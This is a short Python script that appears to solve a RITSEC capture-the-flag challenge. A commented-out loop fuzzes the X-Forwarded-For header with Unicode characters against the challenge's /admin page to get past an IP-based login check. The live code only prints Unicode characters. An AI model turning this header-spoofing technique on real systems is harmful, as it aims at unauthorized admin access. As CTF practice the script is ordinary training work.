import requests

header = {
	'Host': 'ctfchallenges.ritsec.club:81',
	'Cache-Control': 'max-age=0',
	'Upgrade-Insecure-Requests': '1',
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36',
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
	'Referer': 'http://ctfchallenges.ritsec.club:81/',
	'Accept-Language': 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
	'X-Forwarded-For': '',
	'Connection': 'close'
}

url = 'http://ctfchallenges.ritsec.club:81/admin'

'''
for i in range(134, 10000):
	header['X-Forwarded-For'] = chr(i)
	try:
		res = requests.get(url, headers=header)
	except:
		continue
		
	if "<title>Bad Login</title>" in res.text:
		idx = res.text.index("Your incursion has been logged")
		print(i)
		print(res.text[idx:idx+65])
	elif "400 Bad Request" not in res.text:
		print(res.text)
		break
'''

for i in range(1000000, 1100000):
	print(chr(i), end="")